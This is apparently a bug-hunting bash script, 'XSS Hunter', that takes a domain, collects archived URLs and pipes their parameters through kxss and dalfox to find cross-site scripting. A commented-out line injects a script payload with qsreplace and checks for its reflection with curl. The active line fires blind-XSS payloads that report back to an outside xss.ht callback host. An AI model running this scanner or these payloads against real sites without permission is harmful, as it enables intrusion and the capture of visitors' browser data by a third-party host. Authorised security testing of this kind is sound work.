#!/bin/bash

printf "==============" | notify --silent
printf "XSS Hunter started" | notify --silent
sleep 2
printf "==============" | notify --silent

printf "\nPlease enter a domain : "
read DOMAIN

cd ${RUNNING_PATH}
cd vulnerability && mkdir xss && cd xss

wayback

# cat urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'  | tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable:)\n]" || echo "$host \033[0;32m Not able :(\n"; done

cat urls.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | notify --silent | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -S -b https://anubhav1403.xss.ht -o xss-dalfox.txt
